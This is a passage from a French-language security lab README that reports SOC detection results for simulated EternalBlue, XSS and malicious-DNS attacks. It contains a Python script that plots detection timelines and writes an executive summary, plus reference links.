      "detection_rate": "85.0%",
      "detection_sources": [
        {"dns_analysis": 75, "accuracy": "75.0%"},
        {"threat_intel": 65, "accuracy": "65.0%"},
        {"proxy_logs": 55, "accuracy": "55.0%"}
      ],
      "false_positives": 8,
      "false_negatives": 15,
      "average_detection_time": "1.8 seconds"
    }
  },
  "soar_automation": {
    "total_alerts_processed": 165,
    "cases_created": 142,
    "automatic_responses": 98,
    "manual_interventions": 44,
    "response_time_average": "12.5 seconds",
    "successful_blockings": 89,
    "failed_responses": 9
  }
}
```

#### Analyse Temporelle
```python
#!/usr/bin/env python3
# temporal_analysis.py - Analyze attack detection over time

import json
import matplotlib.pyplot as plt
from datetime import datetime, timedelta
import pandas as pd

def analyze_detection_timeline():
    """Analyze detection performance over time"""
    
    # Sample detection data
    detection_data = [
        {"timestamp": "2025-07-30T19:04:34Z", "attack_type": "eternalblue", "detected": True, "response_time": 2.3},
        {"timestamp": "2025-07-30T19:15:22Z", "attack_type": "xss", "detected": True, "response_time": 0.1},
        {"timestamp": "2025-07-30T19:22:15Z", "attack_type": "malicious_dns", "detected": True, "response_time": 1.8},
        {"timestamp": "2025-07-30T19:35:44Z", "attack_type": "eternalblue", "detected": False, "response_time": 0},
        {"timestamp": "2025-07-30T19:42:18Z", "attack_type": "xss", "detected": True, "response_time": 0.2}
    ]
    
    # Convert to DataFrame
    df = pd.DataFrame(detection_data)
    df['timestamp'] = pd.to_datetime(df['timestamp'])
    
    # Calculate detection rates by hour
    df['hour'] = df['timestamp'].dt.hour
    hourly_stats = df.groupby(['hour', 'attack_type']).agg({
        'detected': ['count', 'sum'],
        'response_time': 'mean'
    }).reset_index()
    
    # Plot detection rates
    plt.figure(figsize=(12, 8))
    
    # Detection rate over time
    plt.subplot(2, 2, 1)
    for attack_type in df['attack_type'].unique():
        attack_data = df[df['attack_type'] == attack_type]
        detection_rate = attack_data.groupby('hour')['detected'].mean()
        plt.plot(detection_rate.index, detection_rate.values, 
                label=f'{attack_type}', marker='o')
    
    plt.title('Detection Rate by Hour')
    plt.xlabel('Hour')
    plt.ylabel('Detection Rate')
    plt.legend()
    plt.grid(True)
    
    # Response time distribution
    plt.subplot(2, 2, 2)
    detected_only = df[df['detected'] == True]
    plt.hist(detected_only['response_time'], bins=20, alpha=0.7)
    plt.title('Response Time Distribution')
    plt.xlabel('Response Time (seconds)')
    plt.ylabel('Frequency')
    plt.grid(True)
    
    # Attack type distribution  
    plt.subplot(2, 2, 3)
    attack_counts = df['attack_type'].value_counts()
    plt.pie(attack_counts.values, labels=attack_counts.index, autopct='%1.1f%%')
    plt.title('Attack Type Distribution')
    
    # Detection success by attack type
    plt.subplot(2, 2, 4)
    detection_by_type = df.groupby('attack_type')['detected'].mean()
    plt.bar(detection_by_type.index, detection_by_type.values)
    plt.title('Detection Success Rate by Attack Type')
    plt.xlabel('Attack Type')
    plt.ylabel('Success Rate')
    plt.xticks(rotation=45)
    plt.grid(True)
    
    plt.tight_layout()
    plt.savefig('/tmp/detection_analysis.png')
    plt.show()

def generate_executive_summary():
    """Generate executive summary of testing results"""
    
    summary = {
        "executive_summary": {
            "test_period": "July 30, 2025 - August 5, 2025",
            "total_attacks_simulated": 165,
            "overall_detection_rate": "90.9%",
            "false_positive_rate": "4.2%",
            "average_response_time": "4.7 seconds",
            
            "key_findings": [
                "XSS detection shows highest accuracy (94.0%) due to ModSecurity rules",
                "EternalBlue detection effective (93.3%) but requires signature tuning", 
                "Malicious website detection needs threat intel feed improvements",
                "SOAR automation successfully handled 59.4% of incidents automatically"
            ],
            
            "recommendations": [
                "Enhance DNS monitoring with machine learning algorithms",
                "Implement behavioral analysis for zero-day attack detection",
                "Increase threat intelligence feed integration",
                "Optimize Suricata rules to reduce false positives"
            ],
            
            "risk_assessment": {
                "current_security_posture": "STRONG",
                "critical_gaps": [
                    "Advanced persistent threat detection",
                    "Encrypted malware communication",
                    "Fileless attack vectors"
                ],
                "mitigation_priority": "HIGH"
            }
        }
    }
    
    with open('executive_summary.json', 'w') as f:
        json.dump(summary, f, indent=2)
    
    print("[+] Executive summary generated")

if __name__ == "__main__":
    analyze_detection_timeline()
    generate_executive_summary()
```

---

## 🔗 Références

- **[MITRE ATT&CK Framework](https://attack.mitre.org/)**
- **[OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)**
- **[EternalBlue Technical Analysis](../../07_DOCUMENTATION/technical/eternalblue.md)**
- **[XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)**

### Fichiers d'Attaque

Les fichiers de test et d'exploitation sont disponibles dans les sous-dossiers :  
- **📂 [eternalblue/](./eternalblue/)**
- **📂 [xss/](./xss/)**  
- **📂 [malicious_websites/](./malicious_websites/)**

---
**Mise à jour** : Août 2025 - Med10S
